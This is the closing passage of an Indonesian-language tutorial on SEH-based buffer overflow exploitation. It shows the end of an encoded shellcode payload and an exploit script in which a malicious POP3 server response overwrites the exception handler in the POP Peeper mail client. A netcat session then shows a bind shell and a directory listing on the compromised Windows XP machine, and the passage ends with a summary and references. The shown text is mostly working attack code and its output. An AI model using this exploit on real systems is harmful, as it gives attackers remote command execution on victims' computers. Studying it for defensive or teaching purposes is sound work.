+"\x43\x39\x4d\x48\x4c\x37\x4a\x43\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36" +
+"\x44\x47\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x57\x46\x34\x4f\x4f" +
+"\x48\x4d\x4b\x45\x47\x45\x44\x55\x41\x35\x41\x55\x41\x35\x4c\x36" +
+"\x41\x50\x41\x55\x41\x35\x45\x45\x41\x45\x4f\x4f\x42\x4d\x4a\x56" +
+"\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x55\x4f\x4f\x48\x4d\x4c\x36" +
+"\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x48\x47\x35\x4e\x4f" +
+"\x43\x58\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d" +
+"\x4a\x36\x4f\x4e\x50\x4c\x42\x4e\x42\x56\x43\x55\x4f\x4f\x48\x4d" +
+"\x4f\x4f\x42\x4d\x5a"
+
+junk = "A" * 1072
+seh = "\x4c\x51\x01\x10"  # pop,pop,ret from imap.dll
+nseh = "\x90\x90\xeb\x1e" # jump 30 bytes forward
+nop = "\x90" * 50         # NOP sled
+chld.put("+OK\r\n1 " + junk + nseh + seh + nop + shellcode + "\r\n.\r\n")
+sock.close
+
+
+Dan bagian yang ditunggu-tunggu setelah exploit dijalankan :),
+
+
+$ nc 172.16.30.129 55555
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Program Files\POP Peeper>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8C23-6511
+
+ Directory of C:\Program Files\POP Peeper
+
+06/04/2009  01:21 AM    <DIR>          .
+06/04/2009  01:21 AM    <DIR>          ..
+04/28/2005  09:30 PM             8,195 HtmlRef.dat
+01/22/2009  05:42 AM           126,976 Imap.dll
+01/22/2009  04:23 AM           147,898 POPPeeper.chm
+01/22/2009  05:43 AM         1,470,464 POPPeeper.exe
+12/11/2009  08:37 PM               452 PPInfo.txt
+01/22/2009  05:41 AM           651,264 SendMail.dll
+12/10/2009  03:09 PM            44,715 Uninstall.exe
+01/22/2009  08:01 AM            38,309 Version.txt
+01/22/2009  05:41 AM           487,424 WebMail.dll
+               9 File(s)      2,975,697 bytes
+               2 Dir(s)  25,741,553,664 bytes free
+
+C:\Program Files\POP Peeper>
+
+
+Game Over!
+
+
+--[7]-- Summary
+
+Jika kita lihat sekilas maka tehnik eksploitasi dengan memanfaatkan SEH ini
+sudah mulai usang, ditambah lagi sekarang ini tehnik pencegahannya telah
+banyak bermunculan, diantaranya SafeSEH[7] dan SEHOP[8]. Namun saya tetap
+berpendapat bahwa memahami suatu tehnik eksploitasi secara mendasar merupakan
+suatu keharusan, dimana tehnik-tehnik baru pada umumnya berdasarkan tehnik
+lama yang dikembangkan. Dan dengan kenyataan bahwa SEH based exploit masih
+banyak digunakan pada beragam implementasi exploit untuk lingkungan Microsoft
+Windows (pengembangan nya bisa untuk browser based exploit) maka pembahasan
+mengenai hal ini rasanya cukup layak sebagai kawan minum teh di sore hari :). 
+
+My greets for all indonesian undergr0und community, keep hacking, keep
+non-profit and keep undergr0und guys.
+
+Semoga Bermanfaat!
+
+
+--[8]-- Reference
+
+[1] http://www.microsoft.com/msj/0197/exception/exception.aspx
+[2] http://www.codeproject.com/KB/debug/windbg_part1.aspx
+[3] http://www.ngssoftware.com/papers/defeating-w2k3-stack-protection.pdf
+[4] http://www.corelan.be:8800/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
+[5] http://en.wikipedia.org/wiki/Buffer_overflow_protection
+[6] http://www.krakowlabs.com/res/adv/KL0209ADV-poppeeper_uidl-bof.txt
+[7] http://msdn.microsoft.com/en-us/library/9a89h429%28VS.80%29.aspx
+[8] http://blogs.technet.com/srd/archive/2009/02/02/preventing-the-exploitation-of-seh-overwrites-with-sehop.aspx
